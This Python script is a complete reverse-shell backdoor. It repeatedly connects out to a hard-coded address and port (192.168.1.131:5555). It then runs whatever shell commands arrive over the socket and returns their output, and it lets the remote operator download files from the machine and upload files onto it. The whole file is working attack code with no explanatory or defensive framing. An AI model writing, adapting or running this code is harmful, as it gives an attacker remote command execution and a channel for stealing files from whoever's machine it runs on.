import socket
import time
import subprocess
import json
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('192.168.1.131', 5555))
            shell()
            s.close()
            break
        except:
            continue

def upload_file(file_name):
    with open(file_name, 'rb') as f:
        s.send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        s.settimeout(1)
        try:
            chunk = s.recv(1024)
            while chunk:
                f.write(chunk)
                chunk = s.recv(1024)
        except socket.timeout:
            pass
        s.settimeout(None)

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            reliable_send(result.decode())

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
